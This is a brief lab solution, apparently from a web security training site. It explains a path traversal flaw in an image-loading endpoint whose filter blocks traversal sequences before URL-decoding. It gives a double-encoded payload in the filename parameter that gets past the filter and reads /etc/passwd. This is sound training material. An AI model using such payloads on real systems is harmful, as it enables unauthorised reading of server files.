This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

- Modify the URL to:
https://YOUR-LAB-ID.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd
